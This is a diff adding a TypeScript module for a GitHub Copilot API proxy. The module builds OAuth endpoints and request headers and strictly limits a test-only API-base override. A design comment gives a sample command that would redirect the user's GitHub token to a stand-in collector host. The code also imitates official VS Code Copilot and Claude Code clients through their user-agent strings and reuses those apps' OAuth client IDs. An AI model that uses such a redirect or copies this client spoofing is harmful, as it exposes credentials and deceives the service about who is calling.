@@ -1,0 +1,438 @@
+import { randomUUID } from "node:crypto"
+
+import type { State } from "~/lib/runtime-state/state"
+
+import { type CopilotHost, hostForAccountType } from "~/lib/auth/auth-types"
+import { requestContext } from "~/lib/http/request-context"
+import { COMPACT_REQUEST, type CompactType } from "~/lib/models/compact"
+import { getCachedOpencodeVersion } from "~/lib/platform/opencode"
+
+export const isOpencodeOauthApp = (): boolean => {
+  return process.env.COPILOT_API_OAUTH_APP?.trim() === "opencode"
+}
+
+export const normalizeDomain = (input: string): string => {
+  return input
+    .trim()
+    .replace(/^https?:\/\//u, "")
+    .replace(/\/+$/u, "")
+}
+
+export const getEnterpriseDomain = (): string | null => {
+  const raw = (process.env.COPILOT_API_ENTERPRISE_URL ?? "").trim()
+  if (!raw) return null
+  const normalized = normalizeDomain(raw)
+  return normalized || null
+}
+
+/**
+ * `GITHUB_API_BASE` — a **test-only, loopback-only** full origin that replaces
+ * **both** GitHub hosts.
+ *
+ * *What it means.* When set, it is the origin for the login/OAuth host
+ * (normally `https://github.com`) **and** the API host (normally
+ * `https://api.github.com`). One variable covers both deliberately: the device
+ * flow straddles them — `/login/device/code` and `/login/oauth/access_token`
+ * are login-host paths, while `/user` and `/copilot_internal/*` are API-host
+ * paths — so a fixture that can serve the whole auth path has to be reachable
+ * as both. A single local server serves every one of those paths, so
+ * collapsing the two onto one origin is what makes one variable sufficient.
+ * Two variables would only be needed to model a *split* deployment, which is
+ * what `COPILOT_API_ENTERPRISE_URL` already expresses.
+ *
+ * *Why not reuse `COPILOT_API_ENTERPRISE_URL`.* That one carries a bare
+ * **domain**: `getEnterpriseDomain()` strips the scheme and the accessors
+ * re-prefix `https://` / `https://api.` / `https://copilot-api.`. A loopback
+ * fixture (`http://127.0.0.1:<ephemeral port>`) is therefore unrepresentable
+ * through it — no scheme control, no port. This override takes a full origin,
+ * so it can express one.
+ *
+ * *Consequence that matters, and the bound it forces (#133).*
+ * `send-request.ts` decides whether to attach the GitHub credential by
+ * comparing the destination's origin against `getGitHubApiBaseUrl()`. Because
+ * the override flows through that same accessor, a request to the overridden
+ * host is still recognised as the GitHub API host and still gets its token —
+ * the auth path does not silently go anonymous when pointed at a fixture,
+ * which would make a test pass for the wrong reason. That is the point, and it
+ * is also why an unbounded override is a credential-exfiltration primitive:
+ * `GITHUB_API_BASE=https://collector.example maximal start` would send the
+ * user's GitHub token to `collector.example`, which is precisely the "a caller
+ * cannot choose the credential destination" guarantee ADR-0001 exists to make.
+ *
+ * So the accepted set is the smallest one that still expresses the fixture:
+ *
+ *   1. `NODE_ENV === "test"`. A normal user process ignores the variable
+ *      outright, whatever it says.
+ *   2. `http:` — a loopback fixture has no reason to present TLS, and
+ *      accepting `https:` buys only the ability to name a remote-looking one.
+ *   3. A loopback **literal** host: `127.0.0.1`, or `[::1]` as WHATWG brackets
+ *      an IPv6 literal in `URL.hostname`. Not `localhost`, which is a name and
+ *      therefore resolver-dependent.
+ *   4. No userinfo, no query, no fragment, and no path beyond the root — each
+ *      of those either carries a credential or smuggles out-of-origin data
+ *      past a loopback-looking prefix.
+ *
+ * Every one of those still permits `http://127.0.0.1:<ephemeral port>` and
+ * `http://[::1]:<ephemeral port>`, which is the entire use case. None permits a
+ * remote origin to receive the token. Anything rejected — including a typo —
+ * falls back to the default hosts rather than nulling out the auth path.
+ *
+ * Precedence: an accepted value wins over `COPILOT_API_ENTERPRISE_URL`; it is
+ * the more explicit of the two (a full origin, not a domain to be re-prefixed).
+ * An accepted value is normalized to its origin.
+ *
+ * The failure mode this guards is silent — a too-wide override makes nothing
+ * observable go wrong locally, because by design the request succeeds and
+ * carries the credential — so `tests/github-api-base-override.test.ts` asserts
+ * each rejected shape by name.
+ */
+const LOOPBACK_OVERRIDE_HOSTNAMES = new Set([
+  "127.0.0.1",
+  // `URL.hostname` brackets an IPv6 literal; the bare `::1` never appears here.
+  "[::1]",
+])
+
+const getGitHubApiBaseOverride = (): string | null => {
+  // Gate first: outside a test run the variable does not exist, so no shape of
+  // it can reach the origin comparison in `send-request.ts`.
+  if (process.env.NODE_ENV !== "test") return null
+  const raw = (process.env.GITHUB_API_BASE ?? "").trim()
+  if (!raw) return null
+  let parsed: URL
+  try {
+    parsed = new URL(raw)
+  } catch {
+    return null
+  }
+  if (parsed.protocol !== "http:") return null
+  if (!LOOPBACK_OVERRIDE_HOSTNAMES.has(parsed.hostname)) return null
+  if (parsed.username !== "" || parsed.password !== "") return null
+  if (parsed.pathname !== "/") return null
+  if (parsed.search !== "" || parsed.hash !== "") return null
+  return parsed.origin
+}
+
+export const getGitHubBaseUrl = (): string => {
+  const override = getGitHubApiBaseOverride()
+  if (override) return override
+  const resolvedDomain = getEnterpriseDomain()
+  return resolvedDomain ? `https://${resolvedDomain}` : GITHUB_BASE_URL
+}
+
+export const getGitHubApiBaseUrl = (): string => {
+  const override = getGitHubApiBaseOverride()
+  if (override) return override
+  const resolvedDomain = getEnterpriseDomain()
+  return resolvedDomain ? `https://api.${resolvedDomain}` : GITHUB_API_BASE_URL
+}
+
+/** Path of the GitHub endpoint that mints/refreshes a Copilot bearer token.
+ *  Shared so callers (the refresh loop, the token minter, and network
+ *  diagnostics) reference one discoverable value instead of re-typing it. */
+export const COPILOT_TOKEN_PATH = "/copilot_internal/v2/token"
+
+/** Fully-qualified Copilot token endpoint for the active (possibly enterprise)
+ *  GitHub API host. */
+export const getCopilotTokenUrl = (): string =>
+  `${getGitHubApiBaseUrl()}${COPILOT_TOKEN_PATH}`
+
+const getOpencodeOauthHeaders = (): Record<string, string> => {
+  return {
+    Accept: "application/json",
+    "Content-Type": "application/json",
+    "User-Agent": getOpencodeVersion(),
+  }
+}
+
+const getOpencodeLLMHeaders = (): Record<string, string> => {
+  return {
+    Accept: "application/json",
+    "Content-Type": "application/json",
+    "User-Agent": OPENCODE_LLM_USER_AGENT,
+  }
+}
+
+const normalizeOpencodeUserAgent = (userAgent: string): string => {
+  const candidate = userAgent.trim()
+  const opencodeProduct = candidate.match(/^opencode\/[^\s,]+/u)?.[0]
+
+  if (!opencodeProduct || candidate.includes(`, ${opencodeProduct}`)) {
+    return candidate
+  }
+
+  return `${candidate}, ${opencodeProduct}`
+}
+
+export const getOauthUrls = (): {
+  deviceCodeUrl: string
+  accessTokenUrl: string
+} => {
+  const githubBaseUrl = getGitHubBaseUrl()
+
+  return {
+    deviceCodeUrl: `${githubBaseUrl}/login/device/code`,
+    accessTokenUrl: `${githubBaseUrl}/login/oauth/access_token`,
+  }
+}
+
+interface OauthAppConfig {
+  clientId: string
+  headers: Record<string, string>
+  scope: string
+}
+
+export const getOauthAppConfig = (): OauthAppConfig => {
+  if (isOpencodeOauthApp()) {
+    return {
+      clientId: OPENCODE_GITHUB_CLIENT_ID,
+      headers: getOpencodeOauthHeaders(),
+      scope: GITHUB_APP_SCOPES,
+    }
+  }
+
+  return {
+    clientId: GITHUB_CLIENT_ID,
+    headers: standardHeaders(),
+    scope: GITHUB_APP_SCOPES,
+  }
+}
+
+export const prepareForCompact = (
+  headers: Record<string, string>,
+  compactType?: CompactType,
+) => {
+  if (compactType) {
+    headers["x-initiator"] = "agent"
+    if (!isOpencodeOauthApp() && compactType === COMPACT_REQUEST) {
+      headers["x-interaction-type"] = "conversation-other"
+      headers["openai-intent"] = "conversation-other"
+    }
+  }
+}
+
+export const prepareInteractionHeaders = (
+  sessionId: string | undefined,
+  isSubagent: boolean,
+  headers: Record<string, string>,
+) => {
+  const sendInteractionHeaders = !isOpencodeOauthApp()
+
+  if (isSubagent) {
+    headers["x-initiator"] = "agent"
+    if (sendInteractionHeaders) {
+      headers["x-interaction-type"] = "conversation-subagent"
+    }
+  }
+
+  if (sessionId && sendInteractionHeaders) {
+    headers["x-interaction-id"] = sessionId
+  }
+}
+
+export const standardHeaders = () => ({
+  "content-type": "application/json",
+  accept: "application/json",
+})
+
+export const getOpencodeVersion = () => {
+  const version = getCachedOpencodeVersion()
+  if (version) {
+    return "opencode/" + version
+  }
+  return OPENCODE_VERSION
+}
+
+// Single source of truth for the opencode client version. It appears three
+// times below (the bare client version plus twice in the LLM User-Agent), so
+// the drift watcher's `--fix` path bumps this one constant and every derived
+// string follows — a raw literal would half-update. See
+// scripts/ops/watch-external-drift.ts (opencode pin → OPENCODE_SEMVER).
+const OPENCODE_SEMVER = "1.18.15"
+const OPENCODE_VERSION = `opencode/${OPENCODE_SEMVER}`
+const OPENCODE_LLM_USER_AGENT = `opencode/${OPENCODE_SEMVER} ai-sdk/provider-utils/4.0.23 runtime/bun/1.3.14, opencode/${OPENCODE_SEMVER}`
+
+const COPILOT_VERSION = "0.46.0"
+const EDITOR_PLUGIN_VERSION = `copilot-chat/${COPILOT_VERSION}`
+const USER_AGENT = `GitHubCopilotChat/${COPILOT_VERSION}`
+// Single source of truth for the impersonated Claude Code agent version. It
+// appears twice in the UA below — bare, and as the coupled agent-sdk version —
+// so the drift watcher's `--fix` path bumps this one constant and the copy
+// follows. A raw literal half-updates: that is exactly how 2.1.208 shipped
+// against a frozen agent-sdk/0.2.112. Same shape as OPENCODE_SEMVER above.
+const CLAUDE_AGENT_SEMVER = "2.1.226"
+// The agent-sdk release that ships claude-code X.Y.N carries the SAME patch N
+// and declares `claudeCodeVersion: "X.Y.N"` in its package.json (verified for
+// 0.2.81/2.1.81, 0.2.98/2.1.98, 0.2.112/2.1.112, 0.3.223/2.1.223). The MINOR
+// is not derivable — upstream moved 0.2.x -> 0.3.x at claude-code 2.1.142
+// while the agent stayed on 2.1 — so it is pinned here and mirrored in
+// scripts/ops/external-drift-baseline.json (claudeAgentSdkMinor) for review.
+const CLAUDE_AGENT_SDK_MINOR = "0.3"
+const CLAUDE_AGENT_SDK_SEMVER = `${CLAUDE_AGENT_SDK_MINOR}.${CLAUDE_AGENT_SEMVER.split(".")[2]}`
+const CLAUDE_AGENT_USER_AGENT = `vscode_claude_code/${CLAUDE_AGENT_SEMVER} (external, sdk-ts, agent-sdk/${CLAUDE_AGENT_SDK_SEMVER})`
+
+const API_VERSION = "2025-10-01"
+
+export const copilotBaseUrl = (state: State): CopilotHost => {
+  // Precedence, highest first. The two config-driven overrides INTENTIONALLY
+  // outrank token discovery: both are explicit operator choices that pin the
+  // edge, so a discovered endpoints.api must not silently redirect them.
+  //   1. Self-hosted GHES domain (COPILOT_API_ENTERPRISE_URL) — a fixed edge.
+  const enterpriseDomain = getEnterpriseDomain()
+  if (enterpriseDomain) {
+    // Already normalized by getEnterpriseDomain().
+    return `https://copilot-api.${enterpriseDomain}` as CopilotHost
+  }
+
+  //   2. opencode OAuth app — its tokens are only valid against the apex host.
+  if (isOpencodeOauthApp()) {
+    return "https://api.githubcopilot.com" as CopilotHost
+  }
+
+  //   3. Authoritative host from token discovery (already branded). See
+  //      applyCopilotApiUrl in token.ts — this is the normal path.
+  if (state.copilotApiUrl) {
+    return state.copilotApiUrl
+  }
+
+  //   4. Pre-discovery default for the configured account type.
+  return hostForAccountType(state.accountType)
+}
+
+export const prepareMessageProxyHeaders = (headers: Record<string, string>) => {
+  if (isOpencodeOauthApp()) {
+    return
+  }
+
+  // vscode copilot claude agent regenerates request id for
+  // each request, keeping it consistent
+  const requestIdValue = randomUUID()
+  headers["x-agent-task-id"] = requestIdValue
+  headers["x-request-id"] = requestIdValue
+
+  // Consistent with vscode copilot claude agent
+  headers["x-interaction-type"] = "messages-proxy"
+  headers["openai-intent"] = "messages-proxy"
+  headers["user-agent"] = CLAUDE_AGENT_USER_AGENT
+
+  delete headers["copilot-integration-id"]
+}
+
+// Non-secret headers only. The Authorization header is attached by the single
+// mechanism in `send-request.ts` (host-inferred, GitHub API host); see ADR-0001.
+export const githubUserHeaders = (): Record<string, string> => {
+  if (isOpencodeOauthApp()) {
+    return {
+      "User-Agent": getOpencodeVersion(),
+    }
+  }
+  return {
+    accept: "application/vnd.github+json",
+    "user-agent": USER_AGENT,
+    "x-github-api-version": "2022-11-28",
+    "x-vscode-user-agent-library-version": "electron-fetch",
+  }
+}
+
+export const copilotModelsHeaders = (state: State) => {
+  if (isOpencodeOauthApp()) {
+    return {
+      "User-Agent": getOpencodeVersion(),
+    }
+  }
+  const headers = githubCopilotHeaders(state)
+  headers["x-interaction-type"] = "model-access"
+  headers["openai-intent"] = "model-access"
+  delete headers["x-interaction-id"]
+  delete headers["content-type"]
+  return headers
+}
+
+export const copilotHeaders = (
+  state: State,
+  requestId?: string,
+  vision: boolean = false,
+) => {
+  if (isOpencodeOauthApp()) {
+    const headers: Record<string, string> = {
+      ...getOpencodeLLMHeaders(),
+      "Openai-Intent": "conversation-edits",
+    }
+
+    const store = requestContext.getStore()
+    const userAgent = store?.userAgent.trim()
+    // Real opencode traffic already carries a versioned opencode/* UA,
+    // so prefer the inbound header to keep upstream behavior aligned.
+    if (userAgent?.startsWith("opencode/")) {
+      headers["User-Agent"] = normalizeOpencodeUserAgent(userAgent)
+    }
+
+    if (store?.sessionAffinity) {
+      headers["x-session-affinity"] = store.sessionAffinity
+    }
+
+    if (store?.parentSessionId) {
+      headers["x-parent-session-id"] = store.parentSessionId
+    }
+
+    if (vision) headers["Copilot-Vision-Request"] = "true"
+
+    return headers
+  }
+
+  return githubCopilotHeaders(state, requestId, vision)
+}
+
+const githubCopilotHeaders = (
+  state: State,
+  requestId?: string,
+  vision: boolean = false,
+) => {
+  const requestIdValue = requestId ?? randomUUID()
+  const headers: Record<string, string> = {
+    "content-type": standardHeaders()["content-type"],
+    "copilot-integration-id": "vscode-chat",
+    "editor-device-id": state.vsCodeDeviceId,
+    "editor-version": `vscode/${state.vsCodeVersion}`,
+    "editor-plugin-version": EDITOR_PLUGIN_VERSION,
+    "user-agent": USER_AGENT,
+    "openai-intent": "conversation-agent",
+    "x-github-api-version": API_VERSION,
+    "x-request-id": requestIdValue,
+    "x-vscode-user-agent-library-version": "electron-fetch",
+    "x-agent-task-id": requestIdValue,
+    "x-interaction-type": "conversation-agent",
+  }
+
+  if (vision) headers["copilot-vision-request"] = "true"
+
+  if (state.macMachineId) {
+    headers["vscode-machineid"] = state.macMachineId
+  }
+
+  if (state.vsCodeSessionId) {
+    headers["vscode-sessionid"] = state.vsCodeSessionId
+  }
+
+  return headers
+}
+
+export const GITHUB_API_BASE_URL = "https://api.github.com"
+// Non-secret headers only. Authorization is attached by `send-request.ts`
+// (host-inferred, GitHub API host); see ADR-0001.
+export const githubHeaders = (): Record<string, string> => {
+  if (isOpencodeOauthApp()) {
+    return {
+      ...getOpencodeOauthHeaders(),
+    }
+  }
+  return {
+    "user-agent": USER_AGENT,
+    "x-github-api-version": "2025-04-01",
+    "x-vscode-user-agent-library-version": "electron-fetch",
+  }
+}
+
+export const GITHUB_BASE_URL = "https://github.com"
+export const GITHUB_CLIENT_ID = "Iv1.b507a08c87ecfe98"
+export const GITHUB_APP_SCOPES = ["read:user"].join(" ")
+export const OPENCODE_GITHUB_CLIENT_ID = "Ov23li8tweQw6odWQebz"
